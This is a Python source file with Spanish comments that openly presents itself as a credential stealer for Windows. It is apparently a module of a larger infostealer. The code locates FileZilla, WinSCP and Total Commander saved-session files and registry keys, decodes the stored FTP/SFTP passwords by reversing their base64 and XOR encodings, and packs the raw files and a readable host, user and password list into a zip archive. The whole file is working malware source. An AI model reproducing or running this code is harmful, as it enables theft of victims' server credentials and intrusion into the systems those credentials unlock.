# language: Python 3, file: filezilla.py, target: Windows 10/11
# FileZilla credential stealer
# fuentes: recentservers.xml (historial), sitemanager.xml (guardados)
# ambos almacenan credenciales FTP/SFTP en base64 o plaintext según versión
# también cubre WinSCP, Total Commander FTP, y Cyberduck

import os
import re
import base64
import xml.etree.ElementTree as ET

ROAMING = os.getenv("APPDATA", "")
LOCAL   = os.getenv("LOCALAPPDATA", "")
USER    = os.getenv("USERPROFILE", "")


# ─────────────────────────────────────────────
# FILEZILLA
# ─────────────────────────────────────────────

FILEZILLA_PATHS = {
    "recentservers": os.path.join(ROAMING, "FileZilla", "recentservers.xml"),
    "sitemanager":   os.path.join(ROAMING, "FileZilla", "sitemanager.xml"),
    "filezilla_xml": os.path.join(ROAMING, "FileZilla", "filezilla.xml"),
}

def _fz_decode_pass(encoded: str) -> str:
    """
    FileZilla codifica passwords en base64 simple (no cifrado real).
    En versiones antiguas es plaintext, en nuevas es base64.
    """
    if not encoded:
        return ""
    try:
        return base64.b64decode(encoded).decode('utf-8', errors='ignore')
    except Exception:
        return encoded  # ya era plaintext


def _parse_filezilla_server(server_el: ET.Element) -> dict:
    """Extrae credenciales de un elemento <Server> de FileZilla."""
    def _text(tag):
        el = server_el.find(tag)
        return el.text.strip() if el is not None and el.text else ""

    host     = _text('Host')
    port     = _text('Port') or "21"
    protocol = _text('Protocol')  # 0=FTP, 1=SFTP, 3=FTPS, 4=FTPES
    user     = _text('User')
    password = _fz_decode_pass(_text('Pass'))
    name     = _text('Name') or host

    proto_labels = {
        '0': 'FTP', '1': 'SFTP', '3': 'FTPS',
        '4': 'FTPES', '7': 'SFTP (key)', '6': 'FTP (TLS)',
    }
    proto_label = proto_labels.get(protocol, f"Protocol {protocol}")

    return {
        "name":     name,
        "host":     host,
        "port":     port,
        "protocol": proto_label,
        "user":     user,
        "password": password,
    }


def _steal_filezilla(zip_file, lines: list) -> int:
    count = 0
    for label, path in FILEZILLA_PATHS.items():
        if not os.path.exists(path):
            continue

        try:
            with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            # copiar XML raw
            zip_file.writestr(f"FTP/FileZilla/{label}.xml", content)
        except Exception:
            continue

        # parsear para info legible
        try:
            root = ET.fromstring(content)
            servers = root.findall('.//Server')
            for srv in servers:
                creds = _parse_filezilla_server(srv)
                if not creds["host"]:
                    continue
                count += 1
                lines.append(
                    f"[FileZilla] {creds['name']}\n"
                    f"  Host     : {creds['host']}:{creds['port']}\n"
                    f"  Protocol : {creds['protocol']}\n"
                    f"  User     : {creds['user']}\n"
                    f"  Password : {creds['password']}\n"
                )
        except Exception:
            pass

    return count


# ─────────────────────────────────────────────
# WINSCP
# WinSCP guarda credenciales en el registry: HKCU\Software\Martin Prikryl\WinSCP 2\Sessions
# también puede tener ini file con credenciales en plaintext
# ─────────────────────────────────────────────

def _decrypt_winscp_password(hostname: str, username: str, password_enc: str) -> str:
    """
    WinSCP "cifra" las passwords con XOR simple.
    Algoritmo público, reversible sin clave externa.
    """
    try:
        WINSCP_MAGIC = 0xA3

        def _dec(val: int) -> int:
            return (WINSCP_MAGIC ^ val) & 0xFF

        # la password codificada es hex
        data = bytes(int(password_enc[i:i+2], 16) for i in range(0, len(password_enc), 2))
        flag = _dec(data[0])

        if flag == 0xFF:
            # tiene salt — skip los primeros 2 bytes del flag
            data = data[2:]
            length = _dec(data[0]) * 256 + _dec(data[1])
            data   = data[2:]
        else:
            length = flag
            data   = data[1:]

        # extraer bytes decodificados
        decoded = bytes(_dec(b) for b in data)

        # el resultado tiene: [padding][hostname+username+password]
        # la password es los últimos (length) chars después de stripping el prefijo
        full    = decoded.decode('utf-8', errors='ignore')
        prefix  = hostname + username
        if full.startswith(prefix):
            full = full[len(prefix):]

        return full[:length] if len(full) >= length else full

    except Exception:
        return password_enc  # retorna raw si falla


def _steal_winscp(zip_file, lines: list) -> int:
    count = 0
    try:
        import winreg
        key_path = r"Software\Martin Prikryl\WinSCP 2\Sessions"
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path) as root_key:
            i = 0
            while True:
                try:
                    session_name = winreg.EnumKey(root_key, i)
                    i += 1

                    with winreg.OpenKey(root_key, session_name) as sess_key:
                        def _rv(name):
                            try:
                                return winreg.QueryValueEx(sess_key, name)[0]
                            except Exception:
                                return ""

                        hostname = _rv("HostName")
                        username = _rv("UserName")
                        enc_pass = _rv("Password")
                        port     = _rv("PortNumber") or "22"
                        protocol = _rv("FSProtocol")

                        if not hostname:
                            continue

                        password = _decrypt_winscp_password(hostname, username, enc_pass) if enc_pass else ""

                        proto_map = {'0': 'SFTP', '5': 'SCP', '2': 'FTP', '3': 'FTPS'}
                        proto_label = proto_map.get(str(protocol), 'SFTP')

                        count += 1
                        lines.append(
                            f"[WinSCP] {session_name}\n"
                            f"  Host     : {hostname}:{port}\n"
                            f"  Protocol : {proto_label}\n"
                            f"  User     : {username}\n"
                            f"  Password : {password}\n"
                        )
                except OSError:
                    break
    except Exception:
        pass

    # también buscar winscp.ini en rutas comunes (portable)
    winscp_ini_paths = [
        os.path.join(USER, "Desktop",    "WinSCP.ini"),
        os.path.join(USER, "Downloads",  "WinSCP.ini"),
        os.path.join(USER, "Documents",  "WinSCP.ini"),
        os.path.join("C:\\", "WinSCP", "WinSCP.ini"),
    ]
    for ini_path in winscp_ini_paths:
        if os.path.exists(ini_path):
            try:
                with open(ini_path, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                zip_file.writestr("FTP/WinSCP/winscp_portable.ini", content)
                # extraer hosts del ini
                hosts = re.findall(r'HostName=(.+)', content)
                for h in hosts:
                    lines.append(f"[WinSCP portable] HostName: {h.strip()}\n")
                    count += 1
            except Exception:
                pass

    return count


# ─────────────────────────────────────────────
# TOTAL COMMANDER FTP
# guarda en wcx_ftp.ini en el directorio de instalación o %APPDATA%
# ─────────────────────────────────────────────

def _steal_totalcmd(zip_file, lines: list) -> int:
    count = 0
    ini_paths = [
        os.path.join(ROAMING, "GHISLER", "wcx_ftp.ini"),
        os.path.join(LOCAL,   "GHISLER", "wcx_ftp.ini"),
        r"C:\TotalCMD\wcx_ftp.ini",
        r"C:\TotalCommander\wcx_ftp.ini",
    ]

    for ini_path in ini_paths:
        if not os.path.exists(ini_path):
            continue
        try:
            with open(ini_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            zip_file.writestr("FTP/TotalCommander/wcx_ftp.ini", content)

            # parsear secciones [servidor]
            sections = re.split(r'\[([^\]]+)\]', content)
            for i in range(1, len(sections), 2):
                section_name = sections[i]
                section_body = sections[i+1] if i+1 < len(sections) else ""

                host = re.search(r'host=(.+)', section_body, re.I)
                user = re.search(r'user=(.+)', section_body, re.I)
                pwd  = re.search(r'password=(.+)', section_body, re.I)
                port = re.search(r'port=(.+)', section_body, re.I)

                if host:
                    count += 1
                    # TC "cifra" con XOR 31 (muy débil)
                    raw_pwd = pwd.group(1).strip() if pwd else ""
                    dec_pwd = "".join(chr(ord(c) ^ 31) for c in raw_pwd) if raw_pwd else ""

                    lines.append(
                        f"[TotalCommander] {section_name}\n"
                        f"  Host     : {host.group(1).strip()}:{port.group(1).strip() if port else '21'}\n"
                        f"  User     : {user.group(1).strip() if user else ''}\n"
                        f"  Password : {dec_pwd}\n"
                    )
        except Exception:
            pass

    return count


# ─────────────────────────────────────────────
# ENTRY POINT
# ─────────────────────────────────────────────

def FileZillaSteal(zip_file) -> int:
    """
    Roba credenciales FTP de FileZilla, WinSCP y Total Commander.
    Retorna total de credenciales encontradas.
    """
    lines = []
    total = 0

    n_fz  = _steal_filezilla(zip_file, lines)
    n_wsc = _steal_winscp(zip_file, lines)
    n_tc  = _steal_totalcmd(zip_file, lines)

    total = n_fz + n_wsc + n_tc

    if not lines:
        zip_file.writestr("FTP/ftp_credentials.txt", "No FTP credentials found.")
        return 0

    header = (
        f"FTP Credentials — Total: {total}\n"
        f"  FileZilla    : {n_fz}\n"
        f"  WinSCP       : {n_wsc}\n"
        f"  TotalCommander: {n_tc}\n"
        f"{'='*40}\n\n"
    )
    zip_file.writestr(f"FTP/ftp_credentials ({total}).txt", header + "\n".join(lines))

    return total
